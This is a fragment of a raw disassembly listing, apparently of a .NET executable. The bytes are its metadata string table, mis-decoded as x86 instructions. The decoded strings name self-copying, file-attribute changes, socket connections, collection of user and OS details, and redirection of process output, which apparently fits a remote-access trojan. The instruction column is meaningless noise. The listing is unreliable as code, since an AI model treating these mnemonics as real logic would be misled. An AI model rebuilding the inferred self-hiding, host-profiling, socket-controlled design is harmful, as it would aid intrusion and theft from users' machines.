  408cf0:	74 69                	je     0x408d5b
  408cf2:	6d                   	insl   (%dx),%es:(%edi)
  408cf3:	65 54                	gs push %esp
  408cf5:	79 70                	jns    0x408d67
  408cf7:	65 48                	gs dec %eax
  408cf9:	61                   	popa
  408cfa:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfb:	64 6c                	fs insb (%dx),%es:(%edi)
  408cfd:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408d01:	74 54                	je     0x408d57
  408d03:	79 70                	jns    0x408d75
  408d05:	65 46                	gs inc %esi
  408d07:	72 6f                	jb     0x408d78
  408d09:	6d                   	insl   (%dx),%es:(%edi)
  408d0a:	48                   	dec    %eax
  408d0b:	61                   	popa
  408d0c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0d:	64 6c                	fs insb (%dx),%es:(%edi)
  408d0f:	65 00 41 63          	add    %al,%gs:0x63(%ecx)
  408d13:	74 69                	je     0x408d7e
  408d15:	76 61                	jbe    0x408d78
  408d17:	74 6f                	je     0x408d88
  408d19:	72 00                	jb     0x408d1b
  408d1b:	43                   	inc    %ebx
  408d1c:	72 65                	jb     0x408d83
  408d1e:	61                   	popa
  408d1f:	74 65                	je     0x408d86
  408d21:	49                   	dec    %ecx
  408d22:	6e                   	outsb  %ds:(%esi),(%dx)
  408d23:	73 74                	jae    0x408d99
  408d25:	61                   	popa
  408d26:	6e                   	outsb  %ds:(%esi),(%dx)
  408d27:	63 65 00             	arpl   %esp,0x0(%ebp)
  408d2a:	4d                   	dec    %ebp
  408d2b:	79 47                	jns    0x408d74
  408d2d:	72 6f                	jb     0x408d9e
  408d2f:	75 70                	jne    0x408da1
  408d31:	43                   	inc    %ebx
  408d32:	6f                   	outsl  %ds:(%esi),(%dx)
  408d33:	6c                   	insb   (%dx),%es:(%edi)
  408d34:	6c                   	insb   (%dx),%es:(%edi)
  408d35:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408d3a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d3b:	41                   	inc    %ecx
  408d3c:	74 74                	je     0x408db2
  408d3e:	72 69                	jb     0x408da9
  408d40:	62 75 74             	bound  %esi,0x74(%ebp)
  408d43:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  408d47:	73 74                	jae    0x408dbd
  408d49:	65 6d                	gs insl (%dx),%es:(%edi)
  408d4b:	2e 52                	cs push %edx
  408d4d:	75 6e                	jne    0x408dbd
  408d4f:	74 69                	je     0x408dba
  408d51:	6d                   	insl   (%dx),%es:(%edi)
  408d52:	65 2e 49             	gs cs dec %ecx
  408d55:	6e                   	outsb  %ds:(%esi),(%dx)
  408d56:	74 65                	je     0x408dbd
  408d58:	72 6f                	jb     0x408dc9
  408d5a:	70 53                	jo     0x408daf
  408d5c:	65 72 76             	gs jb  0x408dd5
  408d5f:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  408d66:	6d                   	insl   (%dx),%es:(%edi)
  408d67:	56                   	push   %esi
  408d68:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408d6f:	74 74                	je     0x408de5
  408d71:	72 69                	jb     0x408ddc
  408d73:	62 75 74             	bound  %esi,0x74(%ebp)
  408d76:	65 00 54 68 72       	add    %dl,%gs:0x72(%eax,%ebp,2)
  408d7b:	65 61                	gs popa
  408d7d:	64 53                	fs push %ebx
  408d7f:	74 61                	je     0x408de2
  408d81:	74 69                	je     0x408dec
  408d83:	63 41 74             	arpl   %eax,0x74(%ecx)
  408d86:	74 72                	je     0x408dfa
  408d88:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  408d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d90:	6d                   	insl   (%dx),%es:(%edi)
  408d91:	70 69                	jo     0x408dfc
  408d93:	6c                   	insb   (%dx),%es:(%edi)
  408d94:	65 72 47             	gs jb  0x408dde
  408d97:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d99:	65 72 61             	gs jb  0x408dfd
  408d9c:	74 65                	je     0x408e03
  408d9e:	64 41                	fs inc %ecx
  408da0:	74 74                	je     0x408e16
  408da2:	72 69                	jb     0x408e0d
  408da4:	62 75 74             	bound  %esi,0x74(%ebp)
  408da7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408dab:	74 43                	je     0x408df0
  408dad:	75 72                	jne    0x408e21
  408daf:	72 65                	jb     0x408e16
  408db1:	6e                   	outsb  %ds:(%esi),(%dx)
  408db2:	74 50                	je     0x408e04
  408db4:	72 6f                	jb     0x408e25
  408db6:	63 65 73             	arpl   %esp,0x73(%ebp)
  408db9:	73 00                	jae    0x408dbb
  408dbb:	50                   	push   %eax
  408dbc:	72 6f                	jb     0x408e2d
  408dbe:	63 65 73             	arpl   %esp,0x73(%ebp)
  408dc1:	73 4d                	jae    0x408e10
  408dc3:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc4:	64 75 6c             	fs jne 0x408e33
  408dc7:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408dcb:	74 5f                	je     0x408e2c
  408dcd:	4d                   	dec    %ebp
  408dce:	61                   	popa
  408dcf:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  408dd6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408dda:	74 5f                	je     0x408e3b
  408ddc:	46                   	inc    %esi
  408ddd:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408de4:	00 
  408de5:	56                   	push   %esi
  408de6:	42                   	inc    %edx
  408de7:	24 41                	and    $0x41,%al
  408de9:	6e                   	outsb  %ds:(%esi),(%dx)
  408dea:	6f                   	outsl  %ds:(%esi),(%dx)
  408deb:	6e                   	outsb  %ds:(%esi),(%dx)
  408dec:	79 6d                	jns    0x408e5b
  408dee:	6f                   	outsl  %ds:(%esi),(%dx)
  408def:	75 73                	jne    0x408e64
  408df1:	44                   	inc    %esp
  408df2:	65 6c                	gs insb (%dx),%es:(%edi)
  408df4:	65 67 61             	gs addr16 popa
  408df7:	74 65                	je     0x408e5e
  408df9:	5f                   	pop    %edi
  408dfa:	30 00                	xor    %al,(%eax)
  408dfc:	5f                   	pop    %edi
  408dfd:	4c                   	dec    %esp
  408dfe:	61                   	popa
  408dff:	6d                   	insl   (%dx),%es:(%edi)
  408e00:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  408e04:	5f                   	pop    %edi
  408e05:	5f                   	pop    %edi
  408e06:	31 00                	xor    %eax,(%eax)
  408e08:	44                   	inc    %esp
  408e09:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408e0d:	67 65 72 44          	addr16 gs jb 0x408e55
  408e11:	69 73 70 6c 61 79 41 	imul   $0x4179616c,0x70(%ebx),%esi
  408e18:	74 74                	je     0x408e8e
  408e1a:	72 69                	jb     0x408e85
  408e1c:	62 75 74             	bound  %esi,0x74(%ebp)
  408e1f:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408e23:	6c                   	insb   (%dx),%es:(%edi)
  408e24:	65 49                	gs dec %ecx
  408e26:	6e                   	outsb  %ds:(%esi),(%dx)
  408e27:	66 6f                	outsw  %ds:(%esi),(%dx)
  408e29:	00 45 78             	add    %al,0x78(%ebp)
  408e2c:	63 65 70             	arpl   %esp,0x70(%ebp)
  408e2f:	74 69                	je     0x408e9a
  408e31:	6f                   	outsl  %ds:(%esi),(%dx)
  408e32:	6e                   	outsb  %ds:(%esi),(%dx)
  408e33:	00 53 6c             	add    %dl,0x6c(%ebx)
  408e36:	65 65 70 00          	gs gs jo 0x408e3a
  408e3a:	45                   	inc    %ebp
  408e3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408e3c:	76 69                	jbe    0x408ea7
  408e3e:	72 6f                	jb     0x408eaf
  408e40:	6e                   	outsb  %ds:(%esi),(%dx)
  408e41:	6d                   	insl   (%dx),%es:(%edi)
  408e42:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e44:	74 00                	je     0x408e46
  408e46:	45                   	inc    %ebp
  408e47:	78 69                	js     0x408eb2
  408e49:	74 00                	je     0x408e4b
  408e4b:	53                   	push   %ebx
  408e4c:	70 65                	jo     0x408eb3
  408e4e:	63 69 61             	arpl   %ebp,0x61(%ecx)
  408e51:	6c                   	insb   (%dx),%es:(%edi)
  408e52:	46                   	inc    %esi
  408e53:	6f                   	outsl  %ds:(%esi),(%dx)
  408e54:	6c                   	insb   (%dx),%es:(%edi)
  408e55:	64 65 72 00          	fs gs jb 0x408e59
  408e59:	47                   	inc    %edi
  408e5a:	65 74 46             	gs je  0x408ea3
  408e5d:	6f                   	outsl  %ds:(%esi),(%dx)
  408e5e:	6c                   	insb   (%dx),%es:(%edi)
  408e5f:	64 65 72 50          	fs gs jb 0x408eb3
  408e63:	61                   	popa
  408e64:	74 68                	je     0x408ece
  408e66:	00 50 61             	add    %dl,0x61(%eax)
  408e69:	74 68                	je     0x408ed3
  408e6b:	00 47 65             	add    %al,0x65(%edi)
  408e6e:	74 46                	je     0x408eb6
  408e70:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408e77:	00 
  408e78:	53                   	push   %ebx
  408e79:	74 72                	je     0x408eed
  408e7b:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  408e82:	63 61 74             	arpl   %esp,0x74(%ecx)
  408e85:	00 46 69             	add    %al,0x69(%esi)
  408e88:	6c                   	insb   (%dx),%es:(%edi)
  408e89:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408e8d:	70 79                	jo     0x408f08
  408e8f:	00 46 69             	add    %al,0x69(%esi)
  408e92:	6c                   	insb   (%dx),%es:(%edi)
  408e93:	65 53                	gs push %ebx
  408e95:	79 73                	jns    0x408f0a
  408e97:	74 65                	je     0x408efe
  408e99:	6d                   	insl   (%dx),%es:(%edi)
  408e9a:	49                   	dec    %ecx
  408e9b:	6e                   	outsb  %ds:(%esi),(%dx)
  408e9c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408e9e:	00 46 69             	add    %al,0x69(%esi)
  408ea1:	6c                   	insb   (%dx),%es:(%edi)
  408ea2:	65 41                	gs inc %ecx
  408ea4:	74 74                	je     0x408f1a
  408ea6:	72 69                	jb     0x408f11
  408ea8:	62 75 74             	bound  %esi,0x74(%ebp)
  408eab:	65 73 00             	gs jae 0x408eae
  408eae:	73 65                	jae    0x408f15
  408eb0:	74 5f                	je     0x408f11
  408eb2:	41                   	inc    %ecx
  408eb3:	74 74                	je     0x408f29
  408eb5:	72 69                	jb     0x408f20
  408eb7:	62 75 74             	bound  %esi,0x74(%ebp)
  408eba:	65 73 00             	gs jae 0x408ebd
  408ebd:	50                   	push   %eax
  408ebe:	72 6f                	jb     0x408f2f
  408ec0:	6a 65                	push   $0x65
  408ec2:	63 74 44 61          	arpl   %esi,0x61(%esp,%eax,2)
  408ec6:	74 61                	je     0x408f29
  408ec8:	00 53 65             	add    %dl,0x65(%ebx)
  408ecb:	74 50                	je     0x408f1d
  408ecd:	72 6f                	jb     0x408f3e
  408ecf:	6a 65                	push   $0x65
  408ed1:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  408ed5:	72 6f                	jb     0x408f46
  408ed7:	72 00                	jb     0x408ed9
  408ed9:	43                   	inc    %ebx
  408eda:	6c                   	insb   (%dx),%es:(%edi)
  408edb:	65 61                	gs popa
  408edd:	72 50                	jb     0x408f2f
  408edf:	72 6f                	jb     0x408f50
  408ee1:	6a 65                	push   $0x65
  408ee3:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  408ee7:	72 6f                	jb     0x408f58
  408ee9:	72 00                	jb     0x408eeb
  408eeb:	54                   	push   %esp
  408eec:	68 72 65 61 64       	push   $0x64616572
  408ef1:	53                   	push   %ebx
  408ef2:	74 61                	je     0x408f55
  408ef4:	72 74                	jb     0x408f6a
  408ef6:	00 53 74             	add    %dl,0x74(%ebx)
  408ef9:	61                   	popa
  408efa:	72 74                	jb     0x408f70
  408efc:	00 4a 6f             	add    %cl,0x6f(%edx)
  408eff:	69 6e 00 52 61 6e 64 	imul   $0x646e6152,0x0(%esi),%ebp
  408f06:	6f                   	outsl  %ds:(%esi),(%dx)
  408f07:	6d                   	insl   (%dx),%es:(%edi)
  408f08:	00 4e 65             	add    %cl,0x65(%esi)
  408f0b:	78 74                	js     0x408f81
  408f0d:	00 57 61             	add    %dl,0x61(%edi)
  408f10:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408f17:	65 
  408f18:	00 57 61             	add    %dl,0x61(%edi)
  408f1b:	69 74 4f 6e 65 00 53 	imul   $0x54530065,0x6e(%edi,%ecx,2),%esi
  408f22:	54 
  408f23:	41                   	inc    %ecx
  408f24:	54                   	push   %esp
  408f25:	68 72 65 61 64       	push   $0x64616572
  408f2a:	41                   	inc    %ecx
  408f2b:	74 74                	je     0x408fa1
  408f2d:	72 69                	jb     0x408f98
  408f2f:	62 75 74             	bound  %esi,0x74(%ebp)
  408f32:	65 00 5f 4c          	add    %bl,%gs:0x4c(%edi)
  408f36:	61                   	popa
  408f37:	6d                   	insl   (%dx),%es:(%edi)
  408f38:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  408f3c:	5f                   	pop    %edi
  408f3d:	5f                   	pop    %edi
  408f3e:	32 00                	xor    (%eax),%al
  408f40:	61                   	popa
  408f41:	30 00                	xor    %al,(%eax)
  408f43:	5f                   	pop    %edi
  408f44:	4c                   	dec    %esp
  408f45:	61                   	popa
  408f46:	6d                   	insl   (%dx),%es:(%edi)
  408f47:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  408f4b:	5f                   	pop    %edi
  408f4c:	5f                   	pop    %edi
  408f4d:	33 00                	xor    (%eax),%eax
  408f4f:	44                   	inc    %esp
  408f50:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408f54:	67 65 72 53          	addr16 gs jb 0x408fab
  408f58:	74 65                	je     0x408fbf
  408f5a:	70 54                	jo     0x408fb0
  408f5c:	68 72 6f 75 67       	push   $0x67756f72
  408f61:	68 41 74 74 72       	push   $0x72747441
  408f66:	69 62 75 74 65 00 54 	imul   $0x54006574,0x75(%edx),%esp
  408f6d:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408f74:	6c                   	insb   (%dx),%es:(%edi)
  408f75:	62 61 63             	bound  %esp,0x63(%ecx)
  408f78:	6b 00 41             	imul   $0x41,(%eax),%eax
  408f7b:	64 64 72 65          	fs fs jb 0x408fe4
  408f7f:	73 73                	jae    0x408ff4
  408f81:	46                   	inc    %esi
  408f82:	61                   	popa
  408f83:	6d                   	insl   (%dx),%es:(%edi)
  408f84:	69 6c 79 00 53 6f 63 	imul   $0x6b636f53,0x0(%ecx,%edi,2),%ebp
  408f8b:	6b 
  408f8c:	65 74 54             	gs je  0x408fe3
  408f8f:	79 70                	jns    0x409001
  408f91:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408f95:	6f                   	outsl  %ds:(%esi),(%dx)
  408f96:	74 6f                	je     0x409007
  408f98:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408f9b:	54                   	push   %esp
  408f9c:	79 70                	jns    0x40900e
  408f9e:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  408fa2:	74 65                	je     0x409009
  408fa4:	00 73 65             	add    %dh,0x65(%ebx)
  408fa7:	74 5f                	je     0x409008
  408fa9:	52                   	push   %edx
  408faa:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408fae:	76 65                	jbe    0x409015
  408fb0:	42                   	inc    %edx
  408fb1:	75 66                	jne    0x409019
  408fb3:	66 65 72 53          	data16 gs jb 0x40900a
  408fb7:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408fbe:	5f                   	pop    %edi
  408fbf:	53                   	push   %ebx
  408fc0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408fc2:	64 42                	fs inc %edx
  408fc4:	75 66                	jne    0x40902c
  408fc6:	66 65 72 53          	data16 gs jb 0x40901d
  408fca:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  408fd1:	76 65                	jbe    0x409038
  408fd3:	72 73                	jb     0x409048
  408fd5:	69 6f 6e 73 00 54 6f 	imul   $0x6f540073,0x6e(%edi),%ebp
  408fdc:	49                   	dec    %ecx
  408fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  408fde:	74 65                	je     0x409045
  408fe0:	67 65 72 00          	addr16 gs jb 0x408fe4
  408fe4:	43                   	inc    %ebx
  408fe5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe6:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe7:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe8:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
  408fed:	6f                   	outsl  %ds:(%esi),(%dx)
  408fee:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408ff1:	74 46                	je     0x409039
  408ff3:	6c                   	insb   (%dx),%es:(%edi)
  408ff4:	61                   	popa
  408ff5:	67 73 00             	addr16 jae 0x408ff8
  408ff8:	45                   	inc    %ebp
  408ff9:	76 65                	jbe    0x409060
  408ffb:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffc:	74 57                	je     0x409055
  408ffe:	61                   	popa
  408fff:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  409006:	65 
  409007:	00 53 65             	add    %dl,0x65(%ebx)
  40900a:	74 00                	je     0x40900c
  40900c:	43                   	inc    %ebx
  40900d:	6f                   	outsl  %ds:(%esi),(%dx)
  40900e:	6d                   	insl   (%dx),%es:(%edi)
  40900f:	70 75                	jo     0x409086
  409011:	74 65                	je     0x409078
  409013:	72 49                	jb     0x40905e
  409015:	6e                   	outsb  %ds:(%esi),(%dx)
  409016:	66 6f                	outsw  %ds:(%esi),(%dx)
  409018:	00 67 65             	add    %ah,0x65(%edi)
  40901b:	74 5f                	je     0x40907c
  40901d:	55                   	push   %ebp
  40901e:	73 65                	jae    0x409085
  409020:	72 4e                	jb     0x409070
  409022:	61                   	popa
  409023:	6d                   	insl   (%dx),%es:(%edi)
  409024:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409028:	74 5f                	je     0x409089
  40902a:	4f                   	dec    %edi
  40902b:	53                   	push   %ebx
  40902c:	46                   	inc    %esi
  40902d:	75 6c                	jne    0x40909b
  40902f:	6c                   	insb   (%dx),%es:(%edi)
  409030:	4e                   	dec    %esi
  409031:	61                   	popa
  409032:	6d                   	insl   (%dx),%es:(%edi)
  409033:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  409037:	70 6c                	jo     0x4090a5
  409039:	61                   	popa
  40903a:	63 65 00             	arpl   %esp,0x0(%ebp)
  40903d:	4f                   	dec    %edi
  40903e:	70 65                	jo     0x4090a5
  409040:	72 61                	jb     0x4090a3
  409042:	74 69                	je     0x4090ad
  409044:	6e                   	outsb  %ds:(%esi),(%dx)
  409045:	67 53                	addr16 push %ebx
  409047:	79 73                	jns    0x4090bc
  409049:	74 65                	je     0x4090b0
  40904b:	6d                   	insl   (%dx),%es:(%edi)
  40904c:	00 67 65             	add    %ah,0x65(%edi)
  40904f:	74 5f                	je     0x4090b0
  409051:	4f                   	dec    %edi
  409052:	53                   	push   %ebx
  409053:	56                   	push   %esi
  409054:	65 72 73             	gs jb  0x4090ca
  409057:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40905e:	5f                   	pop    %edi
  40905f:	53                   	push   %ebx
  409060:	65 72 76             	gs jb  0x4090d9
  409063:	69 63 65 50 61 63 6b 	imul   $0x6b636150,0x65(%ebx),%esp
  40906a:	00 67 65             	add    %ah,0x65(%edi)
  40906d:	74 5f                	je     0x4090ce
  40906f:	49                   	dec    %ecx
  409070:	73 36                	jae    0x4090a8
  409072:	34 42                	xor    $0x42,%al
  409074:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40907b:	74 
  40907c:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409083:	65 6d                	gs insl (%dx),%es:(%edi)
  409085:	00 42 6f             	add    %al,0x6f(%edx)
  409088:	6f                   	outsl  %ds:(%esi),(%dx)
  409089:	6c                   	insb   (%dx),%es:(%edi)
  40908a:	65 61                	gs popa
  40908c:	6e                   	outsb  %ds:(%esi),(%dx)
  40908d:	00 45 6e             	add    %al,0x6e(%ebp)
  409090:	64 52                	fs push %edx
  409092:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  409096:	76 65                	jbe    0x4090fd
  409098:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  40909c:	72 72                	jb     0x409110
  40909e:	61                   	popa
  40909f:	79 00                	jns    0x4090a1
  4090a1:	54                   	push   %esp
  4090a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a3:	4c                   	dec    %esp
  4090a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4090a6:	67 00 53 74          	add    %dl,0x74(%bp,%di)
  4090aa:	72 65                	jb     0x409111
  4090ac:	61                   	popa
  4090ad:	6d                   	insl   (%dx),%es:(%edi)
  4090ae:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4090b2:	70 6f                	jo     0x409123
  4090b4:	73 65                	jae    0x40911b
  4090b6:	00 57 72             	add    %dl,0x72(%edi)
  4090b9:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4090c0:	00 
  4090c1:	57                   	push   %edi
  4090c2:	72 69                	jb     0x40912d
  4090c4:	74 65                	je     0x40912b
  4090c6:	00 67 65             	add    %ah,0x65(%edi)
  4090c9:	74 5f                	je     0x40912a
  4090cb:	4c                   	dec    %esp
  4090cc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090ce:	67 74 68             	addr16 je 0x409139
  4090d1:	00 57 61             	add    %dl,0x61(%edi)
  4090d4:	69 74 43 61 6c 6c 62 	imul   $0x61626c6c,0x61(%ebx,%eax,2),%esi
  4090db:	61 
  4090dc:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4090df:	54                   	push   %esp
  4090e0:	68 72 65 61 64       	push   $0x64616572
  4090e5:	50                   	push   %eax
  4090e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e8:	6c                   	insb   (%dx),%es:(%edi)
  4090e9:	00 51 75             	add    %dl,0x75(%ecx)
  4090ec:	65 75 65             	gs jne 0x409154
  4090ef:	55                   	push   %ebp
  4090f0:	73 65                	jae    0x409157
  4090f2:	72 57                	jb     0x40914b
  4090f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f5:	72 6b                	jb     0x409162
  4090f7:	49                   	dec    %ecx
  4090f8:	74 65                	je     0x40915f
  4090fa:	6d                   	insl   (%dx),%es:(%edi)
  4090fb:	00 4f 62             	add    %cl,0x62(%edi)
  4090fe:	6a 65                	push   $0x65
  409100:	63 74 46 6c          	arpl   %esi,0x6c(%esi,%eax,2)
  409104:	6f                   	outsl  %ds:(%esi),(%dx)
  409105:	77 43                	ja     0x40914a
  409107:	6f                   	outsl  %ds:(%esi),(%dx)
  409108:	6e                   	outsb  %ds:(%esi),(%dx)
  409109:	74 72                	je     0x40917d
  40910b:	6f                   	outsl  %ds:(%esi),(%dx)
  40910c:	6c                   	insb   (%dx),%es:(%edi)
  40910d:	00 43 68             	add    %al,0x68(%ebx)
  409110:	65 63 6b 46          	arpl   %ebp,%gs:0x46(%ebx)
  409114:	6f                   	outsl  %ds:(%esi),(%dx)
  409115:	72 53                	jb     0x40916a
  409117:	79 6e                	jns    0x409187
  409119:	63 4c 6f 63          	arpl   %ecx,0x63(%edi,%ebp,2)
  40911d:	6b 4f 6e 56          	imul   $0x56,0x6e(%edi),%ecx
  409121:	61                   	popa
  409122:	6c                   	insb   (%dx),%es:(%edi)
  409123:	75 65                	jne    0x40918a
  409125:	54                   	push   %esp
  409126:	79 70                	jns    0x409198
  409128:	65 00 4d 6f          	add    %cl,%gs:0x6f(%ebp)
  40912c:	6e                   	outsb  %ds:(%esi),(%dx)
  40912d:	69 74 6f 72 00 45 6e 	imul   $0x746e4500,0x72(%edi,%ebp,2),%esi
  409134:	74 
  409135:	65 72 00             	gs jb  0x409138
  409138:	53                   	push   %ebx
  409139:	65 6c                	gs insb (%dx),%es:(%edi)
  40913b:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  409140:	64 65 00 50 6f       	fs add %dl,%gs:0x6f(%eax)
  409145:	6c                   	insb   (%dx),%es:(%edi)
  409146:	6c                   	insb   (%dx),%es:(%edi)
  409147:	00 42 65             	add    %al,0x65(%edx)
  40914a:	67 69 6e 53 65 6e 64 	imul   $0x646e65,0x53(%bp),%ebp
  409151:	00 
  409152:	49                   	dec    %ecx
  409153:	44                   	inc    %esp
  409154:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  40915b:	6c                   	insb   (%dx),%es:(%edi)
  40915c:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  409160:	6f                   	outsl  %ds:(%esi),(%dx)
  409161:	73 65                	jae    0x4091c8
  409163:	00 47 43             	add    %al,0x43(%edi)
  409166:	00 43 6f             	add    %al,0x6f(%ebx)
  409169:	6c                   	insb   (%dx),%es:(%edi)
  40916a:	6c                   	insb   (%dx),%es:(%edi)
  40916b:	65 63 74 00 5f       	arpl   %esi,%gs:0x5f(%eax,%eax,1)
  409170:	43                   	inc    %ebx
  409171:	6c                   	insb   (%dx),%es:(%edi)
  409172:	6f                   	outsl  %ds:(%esi),(%dx)
  409173:	73 75                	jae    0x4091ea
  409175:	72 65                	jb     0x4091dc
  409177:	24 5f                	and    $0x5f,%al
  409179:	5f                   	pop    %edi
  40917a:	31 00                	xor    %eax,(%eax)
  40917c:	24 56                	and    $0x56,%al
  40917e:	42                   	inc    %edx
  40917f:	24 4c                	and    $0x4c,%al
  409181:	6f                   	outsl  %ds:(%esi),(%dx)
  409182:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409185:	5f                   	pop    %edi
  409186:	41                   	inc    %ecx
  409187:	00 5f 4c             	add    %bl,0x4c(%edi)
  40918a:	61                   	popa
  40918b:	6d                   	insl   (%dx),%es:(%edi)
  40918c:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409190:	5f                   	pop    %edi
  409191:	5f                   	pop    %edi
  409192:	36 00 5f 4c          	add    %bl,%ss:0x4c(%edi)
  409196:	61                   	popa
  409197:	6d                   	insl   (%dx),%es:(%edi)
  409198:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  40919c:	5f                   	pop    %edi
  40919d:	5f                   	pop    %edi
  40919e:	34 00                	xor    $0x0,%al
  4091a0:	5f                   	pop    %edi
  4091a1:	4c                   	dec    %esp
  4091a2:	61                   	popa
  4091a3:	6d                   	insl   (%dx),%es:(%edi)
  4091a4:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4091a8:	5f                   	pop    %edi
  4091a9:	5f                   	pop    %edi
  4091aa:	35 00 44 61 74       	xor    $0x74614400,%eax
  4091af:	61                   	popa
  4091b0:	52                   	push   %edx
  4091b1:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4091b5:	76 65                	jbe    0x40921c
  4091b7:	64 45                	fs inc %ebp
  4091b9:	76 65                	jbe    0x409220
  4091bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4091bc:	74 48                	je     0x409206
  4091be:	61                   	popa
  4091bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4091c0:	64 6c                	fs insb (%dx),%es:(%edi)
  4091c2:	65 72 00             	gs jb  0x4091c5
  4091c5:	72 65                	jb     0x40922c
  4091c7:	6d                   	insl   (%dx),%es:(%edi)
  4091c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c9:	76 65                	jbe    0x409230
  4091cb:	5f                   	pop    %edi
  4091cc:	4f                   	dec    %edi
  4091cd:	75 74                	jne    0x409243
  4091cf:	70 75                	jo     0x409246
  4091d1:	74 44                	je     0x409217
  4091d3:	61                   	popa
  4091d4:	74 61                	je     0x409237
  4091d6:	52                   	push   %edx
  4091d7:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4091db:	76 65                	jbe    0x409242
  4091dd:	64 00 72 65          	add    %dh,%fs:0x65(%edx)
  4091e1:	6d                   	insl   (%dx),%es:(%edi)
  4091e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e3:	76 65                	jbe    0x40924a
  4091e5:	5f                   	pop    %edi
  4091e6:	45                   	inc    %ebp
  4091e7:	72 72                	jb     0x40925b
  4091e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ea:	72 44                	jb     0x409230
  4091ec:	61                   	popa
  4091ed:	74 61                	je     0x409250
  4091ef:	52                   	push   %edx
  4091f0:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4091f4:	76 65                	jbe    0x40925b
  4091f6:	64 00 61 64          	add    %ah,%fs:0x64(%ecx)
  4091fa:	64 5f                	fs pop %edi
  4091fc:	4f                   	dec    %edi
  4091fd:	75 74                	jne    0x409273
  4091ff:	70 75                	jo     0x409276
  409201:	74 44                	je     0x409247
  409203:	61                   	popa
  409204:	74 61                	je     0x409267
